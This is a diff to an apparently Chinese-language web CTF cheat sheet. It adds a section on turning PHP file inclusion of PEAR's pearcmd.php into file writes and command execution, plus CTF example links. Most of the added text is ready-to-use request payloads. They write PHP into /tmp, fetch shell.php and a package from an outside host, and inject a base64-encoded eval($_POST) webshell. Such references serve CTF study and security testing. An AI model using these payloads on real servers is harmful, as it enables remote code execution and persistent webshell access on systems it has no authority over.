@@ -2031,6 +2031,28 @@ HQL injection example (pwn2win 2017)
         - [HITCON CTF 2018 - One Line PHP Challenge](https://blog.kaibro.tw/2018/10/24/HITCON-CTF-2018-Web/)
         - [0CTF 2021 Qual - 1linephp](https://github.com/w181496/CTF/tree/master/0ctf2021_qual/1linephp)
 
+### PEAR
+
+- 條件
+    - 安裝pear (pearcmd.php)
+    - 有開 `register_argc_argv`
+- 寫檔
+    - 法一: `/?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php`
+    - 法二: `/?+-c+/tmp/shell.php+-d+man_dir=<?phpinfo();?>/*+-s+list&file=/usr/local/lib/php/pearcmd.php`
+    - 法三: `/?+download+https://kaibro.tw/shell.php+&fike=/usr/local/lib/php/pearcmd.php`
+    - 法四: `/?+channel-discover+kaibro.tw/302.php?&file=/usr/local/lib/php/pearcmd.php`
+        - 302.php 會跳轉到 test.php 做下載
+- 安裝package
+    - `/?+install+--force+--installroot+/tmp/wtf+http://kaibro.tw/KaibroShell.tgz+?&file=/usr/local/lib/php/pearcmd.php`
+- Command Injection
+    - `/?+install+-R+&file=/usr/local/lib/php/pearcmd.php&+-R+/tmp/other+channel://pear.php.net/Archive_Tar-1.4.14`
+    - `/?+bundle+-d+/tmp/;echo${IFS}PD9waHAgZXZhbCgkX1BPU1RbMF0pOyA/Pg==%7Cbase64${IFS}-d>/tmp/hello-0daysober.php;/+/tmp/other/tmp/pear/download/Archive_Tar-1.4.14.tgz+&file=/usr/local/lib/php/pearcmd.php&`
+    - `/?+svntag+/tmp/;echo${IFS}PD9waHAgZXZhbCgkX1BPU1RbMF0pOyA/Pg==%7Cbase64${IFS}-d>/tmp/hello-0daysober.php;/Archive_Tar+&file=/usr/local/lib/php/pearcmd.php&`
+- Example
+    - [Balsn CTF 2021 - 2linephp](https://github.com/w181496/My-CTF-Challenges/tree/master/Balsn-CTF-2021#2linephp)
+    - [巅峰极客2020 - MeowWorld](https://github.com/w181496/My-CTF-Challenges/tree/master/geekctf-2020)
+
+
 ## data://
 
 - 條件
@@ -2442,6 +2464,7 @@ print marshalled
         - 透過字典檔配合DNS callback，判斷環境使用哪些library, class等資訊
 - [Java-Deserialization-Cheat-Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet)
 - Example
+    - [Balsn CTF 2021 - 4pple Music](https://github.com/w181496/My-CTF-Challenges/tree/master/Balsn-CTF-2021#4pple-music)
     - [0CTF 2021 Qual - 2rm1](https://github.com/ceclin/0ctf-2021-2rm1-soln)
     - [0CTF 2019 Final - hotel booking system](https://balsn.tw/ctf_writeup/20190608-0ctf_tctf2019finals/#tctf-hotel-booking-system)
     - [TrendMicro CTF 2018 Qual - Forensics 300](https://github.com/balsn/ctf_writeup/tree/master/20180914-trendmicroctf#300-3)
